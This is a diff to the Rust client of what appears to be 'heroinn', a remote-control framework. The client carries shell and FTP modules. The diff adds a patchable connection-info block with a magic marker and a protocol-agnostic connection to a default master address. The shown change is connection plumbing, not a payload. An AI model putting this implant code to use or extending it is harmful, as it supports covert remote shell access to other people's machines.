@@ -1,7 +1,7 @@
 use std::{sync::{mpsc::channel, Arc, atomic::AtomicU64, Mutex}, time::Duration, str::FromStr};
 use std::sync::atomic::Ordering::Relaxed;
 use uuid::Uuid;
-use heroinn_util::{protocol::{tcp::{TcpConnection}, Client}, packet::{Message, HostInfo, Heartbeat}, HeroinnClientMsgID, cur_timestamp_secs, HEART_BEAT_TIME, HeroinnServerCommandID, session::{SessionBase, Session, SessionManager}, HeroinnProtocol, close_all_session_in_lock};
+use heroinn_util::{protocol::{ClientWrapper}, packet::{Message, HostInfo, Heartbeat}, HeroinnClientMsgID, cur_timestamp_secs, HEART_BEAT_TIME, HeroinnServerCommandID, session::{SessionBase, Session, SessionManager}, HeroinnProtocol, close_all_session_in_lock, ConnectionInfo};
 use systemstat::{Platform , System, Ipv4Addr};
 use lazy_static::*;
 
@@ -12,10 +12,18 @@ use module::Shell::ShellClient;
 use crate::module::ftp::FtpClient;
 
 lazy_static!{
-    static ref G_MASTER_ADDR : &'static str = "127.0.0.1:8000";
-    static ref G_MASTER_PROTOCOL : HeroinnProtocol = HeroinnProtocol::TCP;
+    static ref G_DEFAULT_MASTER_ADDR : &'static str = "127.0.0.1:8000";
+    static ref G_DEFAULT_MASTER_PROTOCOL : HeroinnProtocol = HeroinnProtocol::TCP;
     static ref G_OUT_BYTES : Arc<AtomicU64> = Arc::new(AtomicU64::new(0));
     static ref G_IN_BYTES : Arc<AtomicU64> = Arc::new(AtomicU64::new(0));
+    static ref G_CONNECTION_INFO : ConnectionInfo = ConnectionInfo{
+        flag : 0x1234567812345678,
+        protocol : HeroinnProtocol::TCP.to_u8(),
+        address_size : 0,
+        address : [0u8;255],
+        remark_size : 0,
+        remark : [0u8;255],
+    };
 }
 
 fn main() {
@@ -52,7 +60,7 @@ fn main() {
 
         let (session_sender , session_receiver) = channel::<SessionBase>();
 
-        let mut client = match TcpConnection::connect(&G_MASTER_ADDR){
+        let mut client : ClientWrapper = match ClientWrapper::connect(&G_DEFAULT_MASTER_PROTOCOL , &G_DEFAULT_MASTER_ADDR){
             Ok(p) => p,
             Err(e) => {
                 log::info!("connect faild : {}" , e);
